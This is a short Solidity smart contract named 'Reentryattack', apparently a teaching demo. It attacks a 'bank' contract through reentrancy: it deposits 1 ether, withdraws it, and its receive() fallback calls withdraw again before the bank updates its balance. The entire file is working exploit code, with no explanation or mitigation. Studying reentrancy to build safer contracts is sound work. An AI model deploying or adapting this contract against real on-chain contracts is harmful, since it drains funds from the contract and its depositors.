// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface bank{
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}
contract Reentryattack {
    address public addr_;
    uint256 public time;
    constructor(address addr){
        addr_ = addr;
    }

    function attack() external payable {
        bank(addr_).deposit{value: 1 ether}();
        bank(addr_).withdraw(1 ether);
    }
    
    receive() payable external{
        time+=1;
        if(time<2){
            bank(addr_).withdraw(1 ether);
        }
    }
}